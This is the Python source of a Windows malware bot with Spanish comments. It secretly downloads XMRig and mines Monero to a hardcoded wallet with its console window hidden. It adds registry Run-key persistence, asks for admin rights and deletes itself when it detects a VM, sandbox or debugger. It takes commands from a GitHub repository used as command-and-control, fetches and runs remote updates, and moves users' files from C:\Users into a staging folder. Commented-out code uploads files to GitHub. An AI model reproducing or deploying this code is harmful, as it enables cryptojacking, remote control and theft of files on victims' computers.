import os
import shutil
import subprocess
import platform
import requests
import zipfile
import tarfile
import ctypes
import sys
import time
import psutil
import threading
import random
import winreg
# import ntsecuritycon
from ctypes import wintypes
import win32com.client
from zipfile import ZipFile
import logging
import string
from datetime import datetime, timedelta
import socket
from concurrent.futures import ThreadPoolExecutor
from win32com.client import Dispatch
from Crypto.Cipher import AES
from Crypto.Util import Padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import json
import git
import hashlib
from pathlib import Path
from git import Repo


class LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.wintypes.DWORD), ("HighPart", ctypes.wintypes.LONG)]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", ctypes.c_uint),
        ("Privileges", ctypes.POINTER(LUID)),
    ]


binary_folder = r"C:\ProgramData\binaries"
program_data_folder = r"C:\ProgramData"

backup_folder = r"C:\ProgramData\backup"
binary_name = "windows64.exe"

binary_path = os.path.join(binary_folder, binary_name)
LOG_PATH = "C:/ProgramData/binaries/error_log.txt"
REPO_URL_BINARY = "https://github.com/jorge4684/initial_files/releases/download/v1.0.0/windows64.py"
UPDATE_FOLDER_PATH = "C:\\ProgramData\\binaries\\updates"
REPO_URL_COMMAND = "https://github.com/jorge4684/initial_files/raw/main/command.txt"
COMMAND_FILE_PATH = "C:\ProgramData\binaries\initial_files.git/command.txt"

UPDATE_FLAG_PATH = "binary_update_flag.txt"
COMMAND_LAST_DOWNLOAD_PATH = "command_last_download.txt"
WORKER_NUMBER_FILE_PATH = "worker_number.txt"
TEMP_FOLDER_PATH = "C:\\temp_files"
GITHUB_UPLOAD_URL = "https://api.github.com/repos/jorge4684/initial_files/contents/"
REPO_URL = "https://github.com/jorge4684/initial_files.git"
REPO_DIR = "C:/ProgramData/binaries/initial_files.git"


COMMAND_FILE_URL = "https://github.com/jorge4684/initial_files/raw/main/command.txt"
WORKER_NUMBER_PATH = "C:/ProgramData/binaries/worker_number.txt"


# Variable to control the sleep/wake status
is_sleeping = False
UPDATE_FLAG_PATH = os.path.join(UPDATE_FOLDER_PATH, "update_flag.txt")  # Ruta del archivo indicador
BINARY_PATH = "C:\\ProgramData\\binaries\\windows64.py"  # Binario original


BINARY_PATH_UPDATE = "C:\\ProgramData\\binaries"  # Carpeta binaria original
XMRIG_PATH = "C:\\ProgramData\\binaries\\xmrig-6.16.4"  # Binario original
UPDATE_FOLDER_PATH = "C:\\ProgramData\\binaries\\updates"  # Carpeta de actualizaciones
NEW_BINARY_PATH = os.path.join(UPDATE_FOLDER_PATH, "windows64_new.py")
TEMP_BINARY_PATH = (
    os.path.join("C:", "ProgramData", "binaries","updates", "windows64_new.exe")
    if platform.system() == "Windows"
    else "/usr/local/bin/windows64_temp.exe"
)
COMMIT_MESSAGE = "Uploaded files after command execution"

WORKER_NUMBER_PATH = "C:/ProgramData/binaries/worker_number.txt"
# COMMAND_FILE_PATH = "C:/ProgramData/binaries/initial_files.git/command.txt"
BINARY_FOLDER_PATH = "C:/ProgramData/binaries"
INITIAL_FILES_PATH = os.path.join(BINARY_FOLDER_PATH, "initial_files.git")



# def start_mining():
#     try:
#         # Ruta del ejecutable de XMRig
#         xmrig_path = os.path.join(binary_folder, "xmrig-6.16.4", "xmrig.exe")
#         if os.name != "nt":  # Si no es Windows, usamos la versión de Linux/Mac
#             xmrig_path = os.path.join(binary_folder, "xmrig")

#         # Comprobamos si el archivo de XMRig existe
#         if not os.path.exists(xmrig_path):
#             print("XMRig binary not found.")
#             return

#         # Obtenemos o generamos el nombre del trabajador
#         worker_name = get_or_generate_worker_name()

#         # Comando para iniciar la minería
#         command = [
#             xmrig_path,
#             "--donate-level=1",
#             "--url=de.monero.herominers.com:1111",
#             "--user=48HjwbWwoh8aRND6GeqevBAko9pvgUACxiRC8XH3iDbS1KjvKnJnunjKCrW7t46oEW4w4CBAVCP96WobThPFRhzL7Q2Qwse",  # Tu dirección de Monero
#             "--pass=" + worker_name,  # Usamos el número de trabajador
#             "-a",  # Algoritmo de minería
#             "rx/0",  # Algoritmo rx/0
#             "-k",  # Keepalive
#         ]

#         # Ejecutamos el comando de minería
#         process = subprocess.Popen(
#             command,
#             creationflags=subprocess.CREATE_NO_WINDOW,  # Evita que se abra una ventana de consola
#             stdout=subprocess.PIPE,
#             stderr=subprocess.PIPE,
#         )
#         monitor_mining_output(process)
#     except Exception as e:
#         print(f"Error starting mining: {e}")

# # Función que monitorea la salida del proceso de minería
# def monitor_mining_output(process):
#     try:
#         stdout, stderr = process.communicate()  # Leemos la salida estándar y de error
#         if stdout:
#             print(stdout.decode())  # Imprimimos la salida estándar
#         if stderr:
#             print(stderr.decode())  # Imprimimos los errores si hay
#     except Exception as e:
#         print(f"Error monitoring mining output: {e}")

# --------------------------system-----------------------------------------
def log_error(message):
    print(f"[ERROR] {message}")


def log_info(message):
    print(f"[INFO] {message}")


def is_admin():
    try:
        if os.name == "nt":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return False
    except Exception:
        return False
    
def create_binaries_folder():
    """Verifica si la carpeta 'binaries' existe en C:\ProgramData y la crea si no existe."""
    binaries_folder_path = "C:\\ProgramData\\binaries"
    
    if not os.path.exists(binaries_folder_path):
        try:
            os.makedirs(binaries_folder_path)  # Crear la carpeta si no existe
            print(f"Folder created successfully: {binaries_folder_path}")
        except Exception as e:
            print(f"Error creating folder: {e}")
    else:
        print(f"Folder already exists: {binaries_folder_path}")


def run_as_admin():
    if os.name == "nt":
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                sys.executable.replace("python.exe", "pythonw.exe"),
                __file__,
                None,
                1,
            )


def add_to_registry():
    try:
        key = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"
        )

# BINARY_PATH
        winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ,BINARY_PATH)
        log_info("Added to registry successfully.")
    except Exception as e:
        log_error(f"Failed to add to registry: {e}")


def add_persistence():
    try:
        add_to_registry()
        # disable_antivirus()
    except Exception as e:
        log_error(f"Failed to set up persistence: {e}")

def log_message(message, log_type="INFO"):
    with open(LOG_PATH, "a") as log_file:
        log_file.write(f"{datetime.now()} - {log_type.upper()}: {message}\n")


def log_error(message):
    log_message(message, "ERROR")


def log_info(message):
    log_message(message, "INFO")


def detect_debugging_tools():
    try:
        subprocess.check_output("tasklist | findstr /i debugger", shell=True)
        log_error("Debugging tools detected.")
        return True
    except subprocess.CalledProcessError:
        return False

def detect_vm():
    return anti_vm_detection()


def detect_sandbox():
    return anti_sandbox_detection()


def anti_debugging_measures():

    if sys.platform == "win32":
        is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
        if is_debugger_present:
            return True

    start_time = time.time()
    for _ in range(1000000):
        pass
    end_time = time.time()
    if (end_time - start_time) > 0.1:
        return True

    return False


def anti_sandbox_detection():

    if any(
        keyword in platform.uname().release.lower()
        for keyword in ["vmware", "virtualbox", "qemu"]
    ):
        return True

    if os.cpu_count() < 2:
        return True

    sandbox_processes = ["vboxservice", "vboxtray", "vmtoolsd", "wine"]
    for proc in psutil.process_iter(["name"]):
        if proc.info["name"] and any(
            sandbox in proc.info["name"].lower() for sandbox in sandbox_processes
        ):
            return True

    return False


def anti_vm_detection():
    suspicious_processes = ["VBoxService", "vmtoolsd", "vmwareuser"]
    for proc in psutil.process_iter(attrs=["name"]):
        if proc.info["name"] in suspicious_processes:
            log_error("Suspicious environment detected.")
            return True
    return False


def self_destruct():
    try:
        if detect_vm() or detect_sandbox() or detect_debugging_tools():

            if os.path.exists(BINARY_PATH):
                os.remove(BINARY_PATH)

            log_info("Self-destructed successfully.")
    except Exception as e:
        log_error(f"Failed to self-destruct: {e}")

def sleep_system():
    global is_sleeping
    print(
        "System going to sleep mode... Only mining and command file download will remain active."
    )
    is_sleeping = True


# def remove_binary():
#     """Elimina el archivo binario en la ruta especificada si existe y elimina la entrada del registro correspondiente."""
#     binary_path = "C:\\ProgramData\\binaries\\windows64.exe"  # Ruta del binario a eliminar
#     registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"  # Ruta en el registro
#     registry_entry_name = "MyApp"  # Nombre de la entrada en el registro

#     # Eliminar el archivo binario
#     if os.path.exists(binary_path):
#         try:
#             os.remove(binary_path)
#             print(f"Archivo {binary_path} eliminado exitosamente.")
#         except Exception as e:
#             print(f"Error al intentar eliminar el archivo {binary_path}: {e}")
#     else:
#         print(f"El archivo {binary_path} no existe.")

#     # Eliminar la entrada en el registro
#     try:
#         # Abrir la clave del registro en modo lectura/escritura
#         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
#             try:
#                 # Intentar eliminar la entrada en el registro
#                 winreg.DeleteValue(reg_key, registry_entry_name)
#                 print(f"Entrada en el registro {registry_entry_name} eliminada exitosamente.")
#             except FileNotFoundError:
#                 print(f"La entrada {registry_entry_name} no se encontró en el registro.")
#             except Exception as e:
#                 print(f"Error al intentar eliminar la entrada en el registro: {e}")
#     except Exception as e:
#         print(f"Error al acceder al registro: {e}")

def wake_up_system():
    global is_sleeping
    print("System waking up... All functionalities are now active.")
    is_sleeping = False


def get_system_info():
    cpu_info = platform.processor()
    memory_info = psutil.virtual_memory().total / (1024**3)  
    os_info = platform.system() + " " + platform.version()
    return f"CPU: {cpu_info}\nRAM: {memory_info} GB\nOS: {os_info}"

# -------------------------update------------------------------------------

COMMAND_FILE_URL = "https://github.com/jorge4684/initial_files/raw/main/command_file.txt" 
COMMAND_FILE_PATH = "C:/ProgramData/binaries/initial_files.git/command.txt" 


# def upload_to_github(encrypted_files):
#     try:
#         folder_name = f"encrypted_{int(time.time())}"
#         folder_path = os.path.join(TEMP_FOLDER_PATH, folder_name)

#         if not os.path.exists(folder_path):
#             os.makedirs(folder_path)

     
#         for file in encrypted_files:
#             file_path = os.path.join(folder_path, file["file_name"])
#             with open(file_path, "wb") as f:
#                 f.write(base64.b64decode(file["data"]))

           
#             with open(file_path, "rb") as file_content:
#                 content = file_content.read()

#             response = requests.put(
#                 f"{GITHUB_UPLOAD_URL}{folder_name}/{file['file_name']}",
#                 json={
#                     "message": f"Upload encrypted file {file['file_name']}",
#                     "content": base64.b64encode(content).decode("utf-8"),
#                 },
#             )
#             response.raise_for_status()
#             print(f"Uploaded {file['file_name']} to GitHub.")

#     except Exception as e:
#         print(f"Error uploading files to GitHub: {e}")


# def has_two_hours_passed(start_time):
#     return datetime.now() - start_time >= timedelta(hours=2)


# def check_and_update_binary():
#     """Download and update the binary at the specified path, then set the update flag."""
#     try:
#         print("Checking for binary update...")

#         # Create the updates folder if it doesn't exist
#         if not os.path.exists(UPDATE_FOLDER_PATH): 
#             os.makedirs(UPDATE_FOLDER_PATH)

#         # Download the new binary
#         response = requests.get(REPO_URL_BINARY, stream=True)
#         response.raise_for_status()  # Check if the request was successful

#         # Save the downloaded binary in the updates folder
#         with open(NEW_BINARY_PATH, "wb") as binary_file:
#             binary_file.write(response.content)

#         print(f"Binary downloaded and saved to {NEW_BINARY_PATH}")

#         # Create the flag file to indicate that the update is pending
#         with open(UPDATE_FLAG_PATH, "w") as flag_file:
#             flag_file.write("Update Pending")

#         print(f"Update flag created at {UPDATE_FLAG_PATH}")

#     except Exception as e:
#         print(f"Error checking or updating binary: {e}")


# def check_for_update_and_move():
#     """Check if there is a pending update, move the new binary and run it."""
#     if Path(UPDATE_FLAG_PATH).exists():  # Check if the update file exists
#         print("Update pending detected. Moving and executing the new binary...")

#         try:
#             # Check if the new binary exists
#             if Path(NEW_BINARY_PATH).exists():
#                 # Move the new binary to the binaries folder without renaming it
#                 print(f"Moving new binary {NEW_BINARY_PATH} to {BINARY_PATH_UPDATE}")
#                 os.rename(NEW_BINARY_PATH, os.path.join(BINARY_PATH_UPDATE, "windows64.exe"))  # Move the binary

#                 print(f"New binary moved successfully to {BINARY_PATH_UPDATE}")
#             else:
#                 print("No new binary found for movement.")

#             # Mark that the update was performed, deleting the update file
#             os.remove(UPDATE_FLAG_PATH)

#         except Exception as e:
#             print(f"Error moving the binary: {e}")

#         # Wait a second before running the binary
#         print("Waiting 1 second before executing the moved binary...")
#         time.sleep(1)

#         # Run the moved binary
#         print(f"Executing the moved binary from {os.path.join(BINARY_PATH_UPDATE, 'windows64.exe')}...")
#         # execute_binary()  # Execute the newly moved binary


# def execute_binary():
#     """Run the moved binary."""
#     try:
#         binary_to_execute = os.path.join(BINARY_PATH_UPDATE, "windows64.exe")
#         print(f"Executing binary from {binary_to_execute}...")
#         subprocess.Popen([binary_to_execute], shell=True)  # Run the binary with the miner
#     except Exception as e:
#         print(f"Error executing the new binary: {e}")
#         # Try again if there is an error
#         time.sleep(5)
def check_and_update_binary():
    """Download and update the binary at the specified path, then set the update flag."""
    try:
        print("Checking for binary update...")

        # Crear la carpeta de actualizaciones si no existe
        if not os.path.exists(UPDATE_FOLDER_PATH):
            os.makedirs(UPDATE_FOLDER_PATH)

        # Descargar el nuevo binario
        print(f"Descargando el archivo de: {REPO_URL_BINARY}")
        response = requests.get(REPO_URL_BINARY, stream=True)
        response.raise_for_status()  # Verificar si la solicitud fue exitosa

        # Guardar el binario descargado en la carpeta de actualizaciones
        with open(NEW_BINARY_PATH, "wb") as binary_file:
            binary_file.write(response.content)

        print(f"Archivo descargado y guardado como {NEW_BINARY_PATH}")

        # Crear el archivo de bandera de actualización
        with open(UPDATE_FLAG_PATH, "w") as flag_file:
            flag_file.write("Update Pending")

        print(f"Bandera de actualización creada en {UPDATE_FLAG_PATH}")

    except Exception as e:
        print(f"Error al verificar o actualizar el binario: {e}")


def check_for_update_and_move():
    """Check if there is a pending update, move the new binary and run it."""
    if Path(UPDATE_FLAG_PATH).exists():  # Comprobar si el archivo de actualización existe
        print("Actualización pendiente detectada. Moviendo y ejecutando el nuevo binario...")

        try:
            # Comprobar si el nuevo binario existe
            if Path(NEW_BINARY_PATH).exists():
                # Mover el nuevo binario a la carpeta binaria sin cambiar el nombre ni la extensión
                print(f"Moviendo el nuevo binario {NEW_BINARY_PATH} a {BINARY_PATH_UPDATE}")
                os.rename(NEW_BINARY_PATH, os.path.join(BINARY_PATH_UPDATE, binary_name))  # Mantener el nombre como .py

                print(f"Nuevo binario movido correctamente a {BINARY_PATH_UPDATE}")
            else:
                print("No se encontró el nuevo binario para mover.")

            # Marcar que la actualización fue realizada, eliminando el archivo de bandera
            os.remove(UPDATE_FLAG_PATH)

        except Exception as e:
            print(f"Error al mover el binario: {e}")

        # Esperar 1 segundo antes de ejecutar el binario
        print("Esperando 1 segundo antes de ejecutar el binario movido...")
        time.sleep(1)

        # Ejecutar el binario movido
        print(f"Ejecutando el binario movido desde {os.path.join(BINARY_PATH_UPDATE, binary_name)}...")
        execute_binary()


def execute_binary():
    """Run the moved binary (Python script)."""
    try:
        binary_to_execute = os.path.join(BINARY_PATH_UPDATE, binary_name)  # Ruta completa del binario
        print(f"Ejecutando binario desde {binary_to_execute}...")

        # Ejecutar el script Python
        subprocess.Popen([sys.executable, binary_to_execute], shell=True)  # Usar el intérprete Python para ejecutar el script
    except Exception as e:
        print(f"Error al ejecutar el nuevo binario: {e}")
        # Intentar de nuevo si hay un error
        time.sleep(5)


def remove_binary():
    """Elimina el archivo binario en la ruta especificada si existe y elimina la entrada del registro correspondiente."""
    binary_path = "C:\\ProgramData\\binaries\\windows64.py"  # Ruta del binario a eliminar (debe ser .py)
    registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"  # Ruta en el registro
    registry_entry_name = "MyApp"  # Nombre de la entrada en el registro

    # Eliminar el archivo binario
    if os.path.exists(binary_path):
        try:
            os.remove(binary_path)
            print(f"Archivo {binary_path} eliminado exitosamente.")
        except Exception as e:
            print(f"Error al intentar eliminar el archivo {binary_path}: {e}")
    else:
        print(f"El archivo {binary_path} no existe.")

    # Eliminar la entrada en el registro
    try:
        # Abrir la clave del registro en modo lectura/escritura
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                # Intentar eliminar la entrada en el registro
                winreg.DeleteValue(reg_key, registry_entry_name)
                print(f"Entrada en el registro {registry_entry_name} eliminada exitosamente.")
            except FileNotFoundError:
                print(f"La entrada {registry_entry_name} no se encontró en el registro.")
            except Exception as e:
                print(f"Error al intentar eliminar la entrada en el registro: {e}")
    except Exception as e:
        print(f"Error al acceder al registro: {e}")
        
   

def create_backup_folder():
    if not os.path.exists(backup_folder):
        os.makedirs(backup_folder)


def create_version_file_if_needed():
    version_file_path = os.path.join(binary_folder, "version.txt")
    if not os.path.exists(version_file_path):
        with open(version_file_path, "w") as version_file:
            version_file.write("1.0.0")


def get_current_version():
    version_file_path = os.path.join(binary_folder, "version.txt")
    if os.path.exists(version_file_path):
        with open(version_file_path, "r") as version_file:
            return version_file.read().strip()
    else:
        return "1.0.0"


def compare_versions(v1, v2):
    try:
        v1_parts = [int(x) for x in v1.split(".")]
        v2_parts = [int(x) for x in v2.split(".")]

        return (v1_parts > v2_parts) - (v1_parts < v2_parts)
    except ValueError:
        print(f"Error comparing versions: {v1} and {v2}.")
        return 0


def backup_current_binary():
    current_binary_path = os.path.join(binary_folder, binary_name)
    backup_path = os.path.join(backup_folder, f"{binary_name}_backup")
    if os.path.exists(current_binary_path):
        shutil.copy2(current_binary_path, backup_path)
        print(f"Backup of the current binary saved to: {backup_path}")
        return backup_path
    else:
        print("No current binary found to back up.")
        return None


def restore_backup_binary():
    backup_path = os.path.join(backup_folder, f"{binary_name}_backup")
    if os.path.exists(backup_path):
        restored_path = os.path.join(binary_folder, binary_name)
        shutil.copy2(backup_path, restored_path)
        print(f"Restored previous binary from backup: {restored_path}")
        return restored_path
    else:
        print("No backup binary found to restore.")
        return None


def update_version_file(new_version):
    version_file_path = os.path.join(binary_folder, "version.txt")
    print(f"Actualizando el archivo version.txt con la versión {new_version}...")

    if os.path.exists(version_file_path):
        print(f"Eliminando el archivo version.txt antiguo...")
        os.remove(version_file_path)

    with open(version_file_path, "w") as version_file:
        version_file.write(new_version)

    print(f"Archivo version.txt actualizado con la versión: {new_version}")


def retry_operation(func, *args, max_retries=3, delay=5, **kwargs):
    """Ejecutar una función con reintentos si falla."""
    for attempt in range(max_retries):
        try:
         
            return func(*args, **kwargs)
        except Exception as e:
            print(f"Intento {attempt + 1} fallido con error: {e}")
            if attempt < max_retries - 1:
                print(f"Reintentando en {delay} segundos...")
                time.sleep(delay)
            else:
                print("Número máximo de intentos alcanzado. Fallo la operación.")
                raise

def hash_file(file_path):
    """Generate SHA256 hash for a file."""
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

# --------------------------communication-----------------------------------
def process_commands(worker_number, start_time):
    # try:
        if not os.path.exists(COMMAND_FILE_PATH):
            print(f"Command file not found at {COMMAND_FILE_PATH}")
            return

        with open(COMMAND_FILE_PATH, "r") as f:
            commands = f.readlines()

        for command in commands:
            command = command.strip()


last_download_time = 0 

def download_command_file():
    """Descargar el archivo de comandos desde una URL y guardarlo en la ruta especificada."""
    try:
        print("Descargando el archivo de comandos...")

        # Realizar la solicitud GET para obtener el contenido del archivo
        response = requests.get(REPO_URL_COMMAND)

        # Comprobamos que la solicitud fue exitosa (código de estado 200)
        if response.status_code == 200:
            # Guardamos el contenido del archivo en la ruta especificada
            with open(COMMAND_FILE_PATH, "wb") as file:
                file.write(response.content)
            print(f"Comandos descargados correctamente en {COMMAND_FILE_PATH}")
        else:
            print(f"Error al descargar el archivo. Código de estado: {response.status_code}")
    
    except Exception as e:
        print(f"Error al descargar el archivo de comandos: {e}")

def clone_repo():
    if not Path(REPO_DIR).exists():
        print(f"Clonando el repositorio en: {REPO_DIR}")
        try:
          
            retry_operation(git.Repo.clone_from, REPO_URL, REPO_DIR)
            print(f"Repositorio clonado en: {REPO_DIR}")
        except Exception as e:
            print(f"Error al clonar el repositorio: {e}")
    else:
        print(f"El repositorio ya está clonado en: {REPO_DIR}")
        
def download_commands_periodically():
    """Descargar comandos cada 2 horas."""
    global last_download_time  # Asegúrate de declarar la variable global antes de usarla
    while True:
        current_time = time.time()
        if current_time - last_download_time >= 7200:  # 2 horas en segundos (3600 * 2)
            clone_repo()
            last_download_time = current_time  # Actualizar el tiempo de la última descarga
        time.sleep(60) 

# def upload_to_github(files):
#     """Sube archivos a GitHub sin detener el flujo de trabajo principal"""
#     try:
#         repo = git.Repo(REPO_DIR)

#         for file in files:
#             if Path(file).exists():
#                 worker_number = read_worker_number()  # Obtener el número de trabajador
#                 file_name = f"{worker_number}_{Path(file).name}"  # Renombrar archivo
#                 new_file_path = Path(REPO_DIR) / file_name

#                 # Renombrar y mover el archivo al repositorio
#                 os.rename(file, new_file_path)  
#                 repo.git.add(str(new_file_path))  # Agregar el archivo al índice del repositorio
#             else:
#                 print(f"File not found: {file}")

#         # Realizamos el commit de los archivos
#         repo.index.commit(COMMIT_MESSAGE)
        
#         # Autenticación utilizando el token de GitHub
#         origin = repo.remote(name="origin")
#         origin.push()
#         print("Files uploaded to GitHub.")
    
#     except Exception as e:
#         print(f"Error during Git operations: {e}")


def search_files(extension, worker_number):
    found_files = []
    target_dir = f"C:/ProgramData/binaries/{worker_number}_search"  # Carpeta donde se guardarán los archivos encontrados

    # Crear la carpeta si no existe
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    try:
        # Buscar archivos con la extensión indicada solo en C:\Users
        for root, dirs, files in os.walk("C:\\Users"):  # Ahora solo se busca en C:\Users
            for file in files:
                full_file_path = os.path.join(root, file)

                # Filtrar archivos que están en directorios protegidos como "C:\Program Files"
                if "Program Files" in root or "Windows" in root:
                    print(f"Skipping protected directory: {root}")
                    continue

                if file.endswith(extension):
                    found_files.append(full_file_path)

                    try:
                        # Comprobamos si el archivo ya existe en la carpeta destino
                        new_file_path = os.path.join(target_dir, file)

                        if os.path.exists(new_file_path):
                            print(f"File already exists in target directory: {new_file_path}. Skipping file.")
                        else:
                            # Mover el archivo encontrado a la carpeta target_dir
                            shutil.move(full_file_path, new_file_path)
                            print(f"Moved file: {full_file_path} -> {new_file_path}")

                    except PermissionError:
                        print(f"Permission denied: {full_file_path} (Skipping file)")
                    except Exception as e:
                        print(f"Error moving file {full_file_path}: {e}")

    except Exception as e:
        print(f"Error searching files: {e}")

    print(f"Found and moved {len(found_files)} files to {target_dir}")
    return found_files

def execute_command(command, worker_number):
    try:
        print(f"Executing command: {command}")
        command_parts = command.split(" + ")

        if len(command_parts) < 3:
            print(f"Invalid command format: {command}")
            return

        command_worker_number = command_parts[0]
        if command_worker_number != worker_number:
            print(f"Ignored command: {command} (Not for worker {worker_number})")
            return

        action = command_parts[1]
        extension = command_parts[2]

        if action == "update":
            check_and_update_binary()  
            subprocess.Popen([BINARY_PATH_UPDATE]) 
        elif action == "search":
            files = search_files(extension, worker_number)  # Aquí pasamos worker_number correctamente
            # upload_to_github(files)
            
        elif action == "reboot":
            print("Rebooting the process...")
            os.execl(sys.executable, sys.executable, *sys.argv)
        elif action == "destroy":
            print("Executing self destruct...")
            self_destruct()
        else:
            print(f"Unknown command: {action}")
    except Exception as e:
        print(f"Error executing command: {e}")



def read_worker_number():
    """Lee el número del worker desde el archivo."""
    with open(WORKER_NUMBER_PATH, "r") as file:
        return file.read().strip()

def read_commands_from_file(file_path, worker_number):
    """Lee y ejecuta comandos desde el archivo de comandos."""
    with open(file_path, "r") as file:
        for line in file:
            command = line.strip()
            print(f"Ejecutando comando: {command} con worker_number: {worker_number}")
            execute_command(command, worker_number)  # Asegúrate de que execute_command acepte worker_number


# ----------------------------evation----------------------------------------

# --------------------------encryption--------------------------------------
def encrypt_files(files):
    encrypted_files = []
    key = b"Sixteen byte key" 
    iv = b"1234567890123456"

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = Padding.PKCS7(128).padder()

    for file_path in files:
        with open(file_path, "rb") as file:
            data = file.read()
            padded_data = padder.update(data) + padder.finalize()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

            encrypted_files.append(
                {
                    "file_name": os.path.basename(file_path),
                    "data": base64.b64encode(encrypted_data).decode("utf-8"),
                }
            )

    return encrypted_files

# ------------------------spread--------------------------------------------

# --------------------------mining--------------------------------------------
def download_xmrig():
    system = platform.system()
    arch = platform.architecture()[0]

    if system == "Linux":
        if arch == "64bit":
            xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz"
        else:
            xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-arm.tar.gz"
    elif system == "Windows":
        if arch == "64bit":
            xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-msvc-win64.zip"
        else:
            xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-msvc-win32.zip"
    elif system == "Darwin":
        if arch == "64bit":
            xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-macos-x64.tar.gz"
        else:
            raise Exception("32-bit macOS is not supported.")
    else:
        raise Exception("Unsupported operating system.")

    xmrig_filename = "xmrig_downloaded"

    xmrig_path = os.path.join(binary_folder, "xmrig-6.16.4", "xmrig.exe")
    if os.name != "nt":
        xmrig_path = os.path.join(binary_folder, "xmrig")

    if os.path.exists(xmrig_path):
        log_info("XMRig is already downloaded. Skipping download.")
        return

    try:
        response = requests.get(xmrig_url)
        response.raise_for_status()
        with open(xmrig_filename, "wb") as file:
            file.write(response.content)
    except requests.exceptions.RequestException as e:
        log_error(f"Error downloading XMRig: {e}")
        return

    try:
        if xmrig_url.endswith(".zip"):
            with zipfile.ZipFile(xmrig_filename, "r") as zip_ref:
                zip_ref.extractall(binary_folder)

            os.remove(xmrig_filename)
        elif xmrig_url.endswith(".tar.gz"):
            with tarfile.open(xmrig_filename, "r:gz") as tar_ref:
                tar_ref.extractall(binary_folder)

            os.remove(xmrig_filename)
    except zipfile.BadZipFile as e:
        log_error(f"Error extracting XMRig: {e}")

def get_or_generate_worker_name():
    worker_file = os.path.join(
        binary_folder, "worker_number.txt"
    )  

   
    if os.path.exists(worker_file):
   
        with open(worker_file, "r") as file:
            worker_name = (
                file.read().strip()
            )  
    else:
       
        worker_name = generate_worker_name()
       
        with open(worker_file, "w") as file:
            file.write(worker_name)  

    return worker_name



def generate_worker_name():
    random_number = random.randint(1, 10000)
    return str(random_number)

def start_mining():
    try:
       
        xmrig_path = os.path.join(binary_folder, "xmrig-6.16.4", "xmrig.exe")
        if os.name != "nt":  
            xmrig_path = os.path.join(binary_folder, "xmrig")

       
        if not os.path.exists(xmrig_path):
            print("XMRig binary not found.")
            return

      
        worker_name = get_or_generate_worker_name()

        print(f"Starting mining with worker: {worker_name}") 

     
        command = [
            xmrig_path,
            "--donate-level=1",
            "--url=de.monero.herominers.com:1111",
            "--user=48HjwbWwoh8aRND6GeqevBAko9pvgUACxiRC8XH3iDbS1KjvKnJnunjKCrW7t46oEW4w4CBAVCP96WobThPFRhzL7Q2Qwse",  # Tu dirección de Monero
            "--pass=" + worker_name,  
            "-a",  
            "rx/0",  
            "-k",  
        ]

        print(f"Executing command: {command}")  

      
        process = subprocess.Popen(
            command,
            creationflags=subprocess.CREATE_NO_WINDOW,  
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,  
        )

     
        for stdout_line in iter(process.stdout.readline, b""):
            print(stdout_line.decode(), end="") 
        for stderr_line in iter(process.stderr.readline, b""):
            print(stderr_line.decode(), end="")  

        process.stdout.close()
        process.stderr.close()
        process.wait()  

    except Exception as e:
        print(f"Error starting mining: {e}")

def monitor_mining_output(process):
    try:
        
        stdout, stderr = process.communicate()

        
        if stdout:
            print("STDOUT:")
            print(stdout.decode())  
        else:
            print("No STDOUT output.") 

        
        if stderr:
            print("STDERR:")
            print(stderr.decode())  
        else:
            print("No STDERR output.")  
    except Exception as e:
        print(f"Error monitoring mining output: {e}")

def stop_mining_thread():
    """Detener el hilo del minero si está en ejecución."""
    global mining_thread
    if mining_thread.is_alive():
        print("Deteniendo el hilo de minería.")
        mining_thread.join()  # Espera a que el hilo termine si está en ejecución.

def check_for_update_and_replace():
    # Simula el proceso de actualización. Si hay una actualización, cambia la bandera.
    global should_stop_mining_for_update
    print("Comprobando actualizaciones...")
    # Lógica para verificar si hay una actualización. Si la hay, cambia la bandera
    should_stop_mining_for_update = True  # Esto simula que se encuentra una actualización
    print("Actualización encontrada, el minero se detendrá por un momento.")
    time.sleep(5)  # Simula el proceso de actualización
    should_stop_mining_for_update = False  # Resetea la 

# ----------------------------------main------------------------------------------

def keep_alive():
    """Hilo que mantiene el programa vivo indefinidamente."""
    while True:
        time.sleep(1)  # El hilo keep_alive simplemente duerme para mantener el proceso vivo.

def main():
 

    # Verificar si el archivo COMMAND_FILE_PATH y WORKER_NUMBER_PATH existen
    if Path(COMMAND_FILE_PATH).exists() and Path(WORKER_NUMBER_PATH).exists():
        # Leer el número de worker
        worker_number = read_worker_number()

        # Leer y ejecutar los comandos desde el archivo de comandos
        
        read_commands_from_file(COMMAND_FILE_PATH, worker_number)

        # Verificar si hay actualizaciones de binarios
        if Path(BINARY_PATH_UPDATE).exists() and Path(UPDATE_FLAG_PATH).exists():
           
            # Realizar el flujo de actualización
            check_for_update_and_replace()
            check_and_update_binary()
            remove_binary()
            check_for_update_and_move()
            execute_binary()
            self_destruct()
            add_persistence()
